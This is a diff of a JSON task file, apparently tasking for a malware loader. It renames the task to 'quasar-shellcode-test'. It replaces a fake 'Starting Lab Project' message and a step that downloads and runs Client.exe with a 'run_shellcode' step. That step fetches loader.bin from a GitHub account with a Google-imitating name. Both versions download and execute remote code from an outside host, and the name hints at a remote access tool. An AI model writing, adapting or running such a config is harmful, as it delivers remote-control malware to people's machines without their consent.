@@ -1,13 +1,9 @@
 {
-  "id": "quasar-lab-test",
+  "id": "quasar-shellcode-test",
   "tasks": [
     {
-      "action": "print",
-      "message": "Starting Lab Project... Please wait."
-    },
-    {
-      "action": "run_exe",
-      "url": "https://github.com/g00glecenter101-arch/msht/raw/refs/heads/main/Client.exe"
+      "action": "run_shellcode",
+      "url": "https://github.com/g00glecenter101-arch/msht/raw/refs/heads/main/loader.bin"
     }
   ]
 }
